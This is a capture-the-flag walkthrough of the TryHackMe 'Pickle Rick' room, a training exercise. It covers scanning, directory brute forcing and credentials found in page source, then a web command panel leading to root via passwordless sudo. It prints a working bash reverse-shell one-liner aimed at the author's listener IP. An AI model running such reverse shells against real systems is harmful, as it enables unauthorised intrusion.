---
title: THM | Pickle Rick
image: /images/pickle-rick.jpeg
date: 2020-08-25 09:00:00 -4:00
categories: [CTFs & Walkthroughs, TryHackMe]
tags: [nmap, dirb, gobuster, nikto, webapp] # add tag
---

# Description

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

> Difficulty: Easy
> 
> Link: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

![](/images/picklerick.gif)

# Task 1.1 - What is the first ingredient Rick needs?

## Information Gathering

Start off with a basic nmap scan to see what is available to us.

![](/images/pr-nmap.png)

| Argument | Description |  
| :---: | :---: |  
| -sCV | Combines -sC and -sV into one argument (-sC uses default scripts and -sV gets service/version info) |  
| -v | Increase verbosity level (use -vv or more for greater effect) |

```console
Not shown: 998 closed ports                                                                                                                                  
PORT   STATE SERVICE VERSION                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)                                                                            
| ssh-hostkey:                                                                
|   2048 60:c4:d7:0e:d3:88:40:2d:bd:4d:5d:e5:c9:56:8b:c0 (RSA)                
|   256 84:c5:c3:e5:6c:3a:ac:bc:95:fb:47:7e:b7:7f:82:2f (ECDSA)               
|_  256 ab:da:0a:62:72:cb:cd:bc:99:7b:cc:a5:37:a0:29:b9 (ED25519)                                                                                            
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                           
| http-methods:                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                  
|_http-server-header: Apache/2.4.18 (Ubuntu)                                  
|_http-title: Rick is sup4r cool                                                                                                                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the above output we learn that ports **22** and **80** are open. It's good practice to have another scan going that checks for all ports just in case there is an unusual port open. Nothing else is open on this box.

## Webpage

Let's poke around the webpage in a browser and see what's there.

![](/images/pr-homepage.png)

Just a page with an image and a message with our task. Let's check out the source code.

```html
<!DOCTYPE html>
<html lang="en">
<head>
<title>Rick is sup4r cool</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="[assets/bootstrap.min.css](http://10.10.85.173/assets/bootstrap.min.css)">
<script src="[assets/jquery.min.js](http://10.10.85.173/assets/jquery.min.js)"></script>
<script src="[assets/bootstrap.min.js](http://10.10.85.173/assets/bootstrap.min.js)"></script>
<style>
.jumbotron {
background-image: url("assets/rickandmorty.jpeg");
background-size: cover;
height: 340px;
}
</style>
</head>
<body>
<div class="container">
<div class="jumbotron"></div>
<h1>Help Morty!</h1></br>
<p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
<p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
</div>
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
</body>
</html>
```

Much more helpful, there is a username given in a comment.

## Gobuster

I'm going to use gobuster to brute force directory names on the server.

![](/images/pr-gobuster2.png)

Go to the robots.txt page and see what's there.

![](/images/pr-robots.png)

Just a blank page with the word *Wubbalubbadubdub*. Looks like a password to me, so now we have some potentially valid credentials. I initially tried logging into SSH with these, but they were not working. So I used **nikto** to enumerate further.

## nikto

![](/images/pr-nikto2.png)
>*Note: This scan will take a long time to finish.*

Nikto found **/login.php**. Perfect, now we have another place to try our credentials. 

![](/images/pr-login.png)

Our creds work here and it brings us to a command panel that gives us command execution on the server.

![](/images/pr-command-portal.png)

Let's see where we are and what's here. We've found the first ingredient.

![](/images/pr-ls2.png)

Using the cat command doesn't work from here though.

![](/images/pr-cat.png)

I used **strings** as an alternative.

![](/images/pr-firstflag.png)

Finally, we have the first ingredient.

# Task 1.2 - Whats the second ingredient Rick needs?
## Reverse Shell
So from here my main goal was to get a reverse shell on to the box, I always use [pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for reference. I tried a nc shell, didn't work, then tried a php shell, didn't work. I was actually stuck here for a bit and just trying random shells in the command panel. Turns out you have to evoke a bash command before the nc shell syntax.
```bash
bash -c "bash -i >& /dev/tcp/10.6.11.75/9001 0>&1"
```

This works, so just set up a nc listener on the port you chose, in my case I'll use 9001.
![](/images/pr-nc.png)

Now that we have a shell I want to see if we can access another user's directory and just poke around the system. Lucky for us rick's home directory has full 777 permissions on it. Inside his directory is the second ingredient.

![](/images/pr-secflag2.png)

# Task 1.3 - Whats the final ingredient Rick needs?
## Privilege Escalation
There is only one flag left to get, so I just assume I will need to be root to get it. I thought for sure I would need to escalate to rick's account before I could get root's, but that's not the case here. Normally it doesn't make sense to check the sudo permissions of the www-data account because we don't even have a password, and by default this account has no permissions other than what's needed to operate the web server. 

This is a good example of just doing the easy priv esc checks before over thinking it. So check the sudo permissions of our current account.
![](/images/pr-sudo-l.png)

Boom. That's right, the www-data account has full sudo permissions with no password needed. Very weird. In fact, you can complete all the tasks from the command panel on the web page by using sudo. No reverse shell needed.

Just do a sudo su and you will have root.
![](/images/pr-3flag.png)

That's it, machine rooted and all task complete.

